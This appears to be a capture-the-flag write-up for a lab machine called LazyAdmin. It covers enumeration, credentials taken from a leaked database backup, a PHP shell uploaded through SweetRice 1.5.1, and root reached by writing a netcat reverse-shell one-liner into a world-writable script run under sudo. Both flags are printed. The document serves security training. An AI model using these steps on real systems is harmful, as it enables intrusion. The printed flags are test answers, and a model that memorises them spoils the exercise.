# LazyAdmin
### #1 User flag

Run a scan to see the open ports
```
nmap -sV <ip>
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
Run dirbuster to get a map of the directorys
```
dirbuster
/content
/content/as (Login page)
/content/inc/mysql_backup/
```
System is using Sweet rice verson 1.5.1

Checked out the mysql backup
```
http://<ip>/content/inc/mysql_backup/
```
Found a user
```
manager
42f749ade7f9e195bf475f37a44cafcb:Password123
```
Start a lissener on the attacker machine.
```
nc -lvp 1234
```
Exploiting an php shell added inside the html in the ads found in version 1.5.1
```
firefox exploit.html
```
Navigate to the ad that got created
```
http://<ip>/content/inc/ads/exploit.php
```
Check who we got privleges as
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Cat out the user flag
```
cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

### #2 Root flag

Get normal bash using python
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Can allso use script to get normal bash
```
/usr/bin/script -qc /bin/bash /dev/null
```
Is there anything we can do without the password
```
sudo -l
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
Checked the backup.pl, itguy is the owner, but it runs a file called copy.sh

```
/etc/copy.sh -l
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```
make sure that the terminal is set to linux
```
export TERM=linux
```
Make the attacker shell listen to request
```
nc -lnvp 5555
```
Vi and nano did not work for me so had to echo the edits to the copy.sh script
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.100.167 5555 >/tmp/f" > /etc/copy.sh
```
Run the no password command
```
sudo /usr/bin/perl /home/itguy/backup.pl
```
Recived the connection, finished with cating out the root flag
```
cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
